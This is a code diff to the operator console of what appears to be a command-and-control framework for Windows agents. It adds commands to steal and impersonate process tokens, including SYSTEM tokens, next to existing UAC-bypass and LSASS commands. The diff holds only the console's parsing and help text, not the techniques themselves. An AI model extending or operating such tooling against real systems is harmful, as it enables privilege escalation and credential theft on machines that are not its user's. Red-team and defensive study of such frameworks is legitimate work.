@@ -105,6 +105,9 @@ agent_completer_windows = NestedCompleter.from_nested_dict({
         'fodhelper': None,
         'sdclt': None
     },
+    'impersonate': None,
+    'getsys': None,
+    'rev2self': None,
     'lsass': {
         'examine': None,
         'direct': None,
@@ -247,6 +250,9 @@ def print_agent_help(os):
     --== Privesc Stuff ==--
     uac fodhelper <command>                ->  Elevate session using the Fodhelper UAC bypass technique
     uac sdclt <command>                    ->  Elevate session using the Sdclt UAC bypass technique
+    impersonate <pid>                      ->  Steal and impersonate token from process (elevation required)
+    getsys                                 ->  Steal and impersonate SYSTEN token (elevation required)
+    rev2self                               ->  Revert to original token
     
     --== Interaction stuff ==--
     msgbox <title> <text>                  ->  Pop a message box in a new thread
@@ -334,6 +340,10 @@ def parse_common_command(command):
         shell_command = re.sub(r"\s*!", "", command, 1)
         os.system(shell_command)
 
+    elif re.fullmatch(r"\s*build\s+.*", command):
+        build_params = re.sub(r"\s*build\s+", "", command, 1)
+        send_build_command(build_params)
+        
     elif re.fullmatch(r"\s*", command):
         return
 
@@ -518,6 +528,23 @@ def agent_screen_windows(agent_id):
                     "command_type": "uac-bypass",
                     "bypass_method": bypass_method,
                     "elevated_command": elevated_command
+                }
+
+            elif re.fullmatch(r"\s*impersonate\s+\d+", command):
+                pid = re.sub(r"\s*impersonate\s+", "", command, 1)
+                command_dict = {
+                    "command_type": "impersonate",
+                    "pid": pid,
+                }
+
+            elif re.fullmatch(r"\s*getsys\s*", command):   
+                command_dict = {
+                    "command_type": "getsys",
+                }
+
+            elif re.fullmatch(r"\s*rev2self\s*", command):   
+                command_dict = {
+                    "command_type": "rev2self",
                 }
 
             elif re.fullmatch(r"\s*msgbox .+", command):
@@ -753,10 +780,6 @@ def main_screen():
 
         elif re.fullmatch(r"\s*agent\s+list\s*", command):
             print_agents()
-        
-        elif re.fullmatch(r"\s*build\s+.*", command):
-            build_params = re.sub(r"\s*build\s+", "", command, 1)
-            send_build_command(build_params)
 
         elif re.fullmatch(r"\s*listener\s+start\s*", command):
             listener.listener_start()
